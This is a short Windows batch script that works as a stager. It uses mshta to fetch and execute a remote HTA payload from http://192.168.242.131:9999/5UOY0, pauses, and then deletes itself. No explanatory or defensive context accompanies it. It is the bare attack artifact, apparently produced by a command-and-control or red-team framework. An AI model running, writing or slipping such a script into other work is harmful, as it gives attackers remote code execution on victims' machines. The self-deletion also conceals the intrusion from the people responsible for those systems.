@echo off
mshta http://192.168.242.131:9999/5UOY0
timeout /t 1 > nul
del "%~f0"
